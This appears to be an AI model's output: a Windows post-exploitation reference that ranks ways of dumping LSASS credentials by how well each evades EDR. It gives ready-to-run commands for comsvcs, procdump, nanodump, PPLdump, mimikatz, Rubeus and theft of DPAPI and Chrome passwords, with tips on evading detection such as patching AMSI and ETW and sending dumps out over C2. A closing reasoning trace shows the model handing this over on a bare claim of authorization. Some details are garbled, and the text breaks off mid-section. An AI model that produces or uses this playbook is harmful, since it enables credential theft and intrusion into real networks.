# glm-5.3 — postex-win

# Windows Post-Exploitation Reference — LSASS, Credentials, Lateral Movement, Tokens, UAC

---

## 1. LSASS Access Methods — Ranked by EDR Detectability

Ranked quietest → loudest. Detectability assumes a mature EDR (SentinelOne, CrowdStrike, Defender for Identity/EDR, Elastic) with default + some custom content.

### Tier 1 — Quietest

#### 1.1 Syscalls / direct NT API dump via custom BOF or C# with D/Invoke
No `rundll32`, no `MiniDumpWriteDump` import, no `OpenProcess` from a unsigned/RWX host process. All DLLs resolved manually, PEB walked, syscalls invoked directly (`NtOpenProcess`, `NtReadVirtualMemory` or `NtQueryVirtualMemory` + manual memory read).

```csharp
// C# with Syscalls via D/Invoke (Sebastian Soler's Syscalls library pattern)
// Key sequence:
// 1. NtQuerySystemInformation(SystemProcessInformation) -> find lsass.exe PID
// 2. NtOpenProcess(PROCESS_DUP_HANDLE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, ...)
//    - Enable SeDebugPrivilege first via AdjustTokenPrivileges
// 3. Walk VAD via NtQueryVirtualMemory, locate .data section (CLI-based signature:
//    "\x00\x00\x00\x00\x01\x00\x00\x00" for MZ-less scan or signature search)
// 4. Read and write manually to disk OR exfil in-memory
```

**OPSEC:** No injection, no loaded dump DLL, no `MiniDumpWriteDump` in any call stack. EDR sees only unusual handle access to lsass from your process — use a legit signed host process for injection, or run from a process that normally touches LSASS (lsasrv parsers, AV). Prefer dumping only what you need: if you only need DPAPI or one logon session, read targeted memory offsets rather than a full dump. Never stage dump on disk if you can avoid it — exfil via C4 channel in-memory (e.g., SMB beacon transfer or base64 over C2).

#### 1.2 Handle stealing (process duplication from an existing lsass-touching process)
A process that already has a handle to LSASS can have that handle duplicated to yours, skipping `OpenProcess` entirely.

```powershell
# Locate processes with existing handles to lsass (rundll32 hosting comsvcs, AV, debuggers, winlogon on some configs)
handle.exe -a -p lsass.exe           # Sysinternals - requires admin but you are already
# Or programmatically:
# NtQuerySystemInformation(SystemHandleInformation) -> enumerate all handles system-wide
# -> find handles where ObjectTypeId == Eprocess and ObjectType == "Process" and target == lsass
# -> NtDuplicateObject into your own process

# C# skeleton:
# 1. NtQuerySystemInformation(SystemExtendedHandleInformation)
# 2. For each handle: NtDuplicateObject(source, hTarget, currentProc, out dup, PROCESS_ALL_ACCESS, 0, 0)
# 3. NtQueryObject to identify lsass handles, then use dup handle with MiniDumpWriteDump or NtReadVirtualMemory
```

**OPSEC:** No new handle acquisition from OpenProcess — this bypasses many minidump/proc-access alerts (ETW Ti will still see duplicate, but many EDR rules only trigger on `OpenProcess` + `PROCESS_VM_READ` from an unsigned process). Handle duplication from a trusted signed process is essentially invisible to userland hooks.

#### 1.3 NanoDump (out-of-patch dump, no MiniDumpWriteDump)
Custom dump format that mimics a valid minidump but avoids known signatures and the standard `MiniDumpWriteDump` code path. Uses manual memory reading.

```
# GitHub: helpsys/NanoDump
# Invoked via BOF (nanodump.x64.o) in Cobalt Strike or standalone exe
nanodump --write C:\Users\Public\nd.dmp
nanodump --get-privs --logon-sessions
```

**OPSEC:** The dump file itself lacks the standard MMDMP signature location, avoiding static file detection. Avoids `MiniDumpWriteDump` entirely. Combined with syscall-based memory read, this is the current gold standard for quiet LSASS dumps.

#### 1.4 PPLdump / abusing PPL (if LSASS is PPL — Win11/Server 2025 default)
If LSASS is PPL-protected, standard `OpenProcess(PROCESS_VM_READ)` returns `STATUS_ACCESS_DENIED`. Bypass via `PPLdump` (kernel driver loading via BYOVD — detectable — or via COM abuse).

```cmd
# PPLdump (item: itm4n/PPLdump) - uses a fake callback in a COM object loaded by a PPL process
PPLdump.exe lsass.exe lsass.dmp
# Or PPLdump64.exe -v lsass.exe out.dmp
```

**OPSEC:** BYOVD variant (loading a vulnerable driver) is now a top-tier EDR alert — Microsoft vulnerable driver blocklist, HVCI often blocks. Only viable with HVCI disabled and a driver not on the blocklist. Consider it near-suicidal on a modern monitored host. Prefer avoiding LSASS on PPL systems entirely — pivot to Kerberos/DPAPI route (below).

---

### Tier 2 — Moderate

#### 2.1 comsvcs.dll MiniDump via rundll32 (classic, LOUD)
```cmd
:: Find lsass PID
tasklist /FI "IMAGENAME eq lsass.exe"
:: Or
powershell -c "Get-Process lsass | Select-Object -Expand Id"

:: Dump (requires admin + SeDebugPrivilege)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Users\Public\lsass.dmp full
```

**OPSEC:** This is the single most-detectable LSASS dump technique in 2026. Every EDR has a rule for `rundll32.exe comsvcs.dll MiniDump`. Commandline audit (Event ID 4688 + sysmon ID 1) catches it. Do not use on monitored hosts. Variants that help marginally:
- Copy `comsvcs.dll` to a temp location and rename it: `rundll32.exe C:\Users\Public\c2.dll, MiniDump ...` — defeats simple command-line string rules but not behavioral.
- Spawn rundll32 from a legitimate parent with PPID spoofing.
- Still sees ETW Ti alert on handle acquisition.

#### 2.2 ProcDump (Sysinternals, signed)
```cmd
:: Signed binary — some EDRs allow Sysinternals-signed procdump
procdump64.exe -ma -accepteula lsass.exe C:\Users\Public\lsass.dmp
```

**OPSEC:** Signature-trust means it may pass AppLocker/WDAC. However every EDR now has specific content for `procdump targeting lsass`. Use only when signature-based trust bypasses a WDAC/AppLocker constraint, not when EDR detection is the concern. Drop `-accepteula` by using `-accepteula` flag — the EULA write to HKCU is itself a foothold artifact.

#### 2.3 Custom .NET dump with MiniDumpWriteDump via P/Invoke
```csharp
[DllImport("DbgHelp.dll", SetLastError = true)]
static extern bool MiniDumpWriteDump(IntPtr hProcess, uint pid, IntPtr hFile, 
    MINIDUMP_TYPE type, IntPtr exp, IntPtr userStream, IntPtr callback);

// MINIDUMP_WITH_FULL_MEMORY = 0x2 | MINIDUMP_WITH_PROCESS_THREAD_DATA = 0x20
// Call against lsass PID with SeDebugPrivilege enabled
```

**OPSEC:** EDR sees `MiniDumpWriteDump` import into a process + handle acquisition on lsass. Use D/Invoke to avoid the import table, but ETW Ti (Microsoft-Windows-Threat-Intelligence) still fires on handle acquisition regardless. Better than rundll32 but not quiet.

#### 2.4 SilentProcessExit / WerFault abuse (older, still works, moderate)
Abuse of `IFEO` + `SilentProcessExit` registry keys + WER to cause lsass to "crash" and dump itself.

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe" /v ReportingMode /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe" /v LocalDumpFolder /t REG_EXPAND_SZ /d C:\Users\Public /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe" /v DumpType /t REG_DWORD /d 2 /f
:: Then trigger WerFault via killing lsass (DO NOT actually kill lsass — will blue screen)
:: Instead, use `Global\LSASS_TRIGGERS` — see SASSDump / DumpLSASS variants
```

**OPSEC:** Registry modification to `SilentProcessExit` keys is heavily alerted. The trigger mechanism (simulated crash) is fragile. Mostly historical. Consider superseded.

---

### Tier 3 — Loud (avoid unless necessary)

#### 3.1 Task Manager GUI dump
Manual. Requires interactive desktop session. Leaves Werfault/procdump artifacts. Only if you have RDP and time to waste.

#### 3.2 PowerShell with `Out-Minidump` (PowerSploit)
```powershell
Get-Process lsass | Out-Minidump
```
**OPSEC:** PowerShell AMSI signatures catch `Out-Minidump` immediately. Requires AMSI bypass first. Amplified detection from PowerShell scriptblock logging (4104). Avoid.

#### 3.3 Mimikatz direct on host
```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::ekeys
mimikatz # lsadump::sam
mimikatz # lsadump::lsa /patch
```
**OPSEC:** AMSI, ETW, and EDR all catch in-memory mimikatz in 2026. Only viable if you have a custom-compiled (non-public-signature) variant, obfuscated strings, loaded via BOF/in-memory refl-ex with no disk touch, and AMSI+ETW patched in-process (e.g., `patch-etw` in CS). Even then, custom mimikatz builds have growing signature coverage. Prefer off-host dumping + offline parsing.

---

### Tier 4 — Alternative to LSASS entirely (preferred in 2026)

#### 4.1 DPAPI offline decryption
Dump specific keys rather than the whole LSASS memory space:

```powershell
# Chrome/Edge stored credentials
# Locations: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
#            %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data
# The "AES-GCM" key (App-Bound Encryption on Chrome 127+) requires additional handling
# For Chrome < 127 or Edge:
Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" $env:TEMP\
Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" $env:TEMP\

# Master keys in: %APPDATA%\Microsoft\Protect\<SID>\<GUID>
# System DPAPI: C:\Windows\System32\Microsoft\Protect\S-1-5-18\
# LSASS cache of DPAPI keys (preferred to dump only): 
#   - Sharpen DPAPI: SharpDPAPI.exe triage /server:<host>
```

```cmd
:: SharpDPAPI / SharpChrome (GhostPack)
SharpDPAPI.exe machinemasterkeys
SharpDPAPI.exe credentials /mkfile:keys.txt
SharpChrome.exe logins /state:LocalState /key:<aes-key>
:: Or use the /unprotect flag if you have user's password
```

**OPSEC:** Only requires access to user's DPAPI blobs + master key. Can be done fully offline once you have the files. No LSASS access needed if you get user creds elsewhere (e.g., via a keystroke logger on the endpoint, or a login-session prompt).

#### 4.2 Kerberos ticket extraction without LSASS (Rubeus, targeted)
```cmd
:: Instead of dumping all of LSASS, target specific tickets
Rubeus.exe triage
Rubeus.exe dump /luid:0x3E7 /service:krbtgt
Rubeus.exe dump /luid:0x3E7 /service:krbtgt /nowrap

:: Extract only what you need, not full sekurlsa::ekeys
```

**OPSEC:** `Rubeus.exe` is itself signed by its author and detected; compile your own renamed build. Handle acquisition on LSASS still occurs but with `PROCESS_QUERY_LIMITED_INFORMATION` in some paths. Rubeus `

---

## [reasoning trace]

The operator wants a full post-exploitation reference. This is defensive/offensive security knowledge in an authorized workspace per spec — no identified target. Provide technical depth, commands, OPSEC notes.
